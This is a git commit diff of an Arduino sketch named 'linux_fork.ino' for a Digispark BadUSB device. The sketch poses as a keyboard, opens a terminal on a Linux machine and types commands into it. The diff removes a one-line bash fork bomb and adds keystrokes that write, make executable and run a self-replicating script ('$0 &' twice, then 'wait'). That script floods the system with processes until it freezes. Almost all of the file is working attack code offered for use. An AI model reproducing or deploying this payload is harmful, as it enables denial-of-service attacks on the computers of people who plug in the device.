255a0f10942cbe199a6d9c98fb29111b50265981
cybersomething <46792838+cybersomething@users.noreply.github.com>
2019-04-30 10:55:47 +0100

    Update linux_fork.ino

--- LinuxForkBomb/linux_fork.ino
+++ LinuxForkBomb/linux_fork.ino
@@ -4,18 +4,50 @@ void setup()
 {
   //empty
 }
-
 void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(MOD_GUI_CENTRE);
+  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT + MOD_ALT_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("mkdir badusb");
   DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_T, MOD_ALT_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT);
+  DigiKeyboard.print("cd badusb");
   DigiKeyboard.delay(500);
-  DigiKeyboard.print(":(){ :|: & };:");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(250);
+  DigiKeyboard.print("touch badUSB.txt");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("cat > badUSB.txt");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("#!/bin/bash");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("$0 &");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("$0 &");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("wait");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("chmod 755 badUSB.txt");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);  
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("./badUSB.txt");
+  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for(;;)
   {
